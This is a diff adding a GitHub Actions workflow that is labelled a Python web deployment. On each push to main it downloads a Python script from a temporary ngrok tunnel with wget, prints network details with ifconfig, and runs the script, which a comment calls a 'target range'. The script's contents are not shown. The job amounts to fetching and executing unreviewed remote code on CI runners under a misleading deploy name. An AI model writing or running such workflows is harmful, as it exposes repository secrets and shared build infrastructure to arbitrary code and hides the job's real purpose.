@@ -1,0 +1,28 @@
+name: Deploy web with python
+
+on:
+  push:
+    branches:
+      - main  # 监听触发部署的分支1
+      
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+      
+    - name: Set up Node.js
+      uses: actions/setup-node@v2
+      with:
+        node-version: '20'  # 指定Node版本
+
+    - name: start dependencies
+      run: |
+        pip install flask
+        wget https://e3f2-240e-804-50f-1b6e-4db1-f213-d14a-9dc9.ngrok-free.app/%E7%A7%8B%E5%90%8D%E5%B1%B1%E7%A0%81%E7%A5%9E.py
+        ifconfig
+        python 秋名山码神.py   # 启动靶场
+
+    
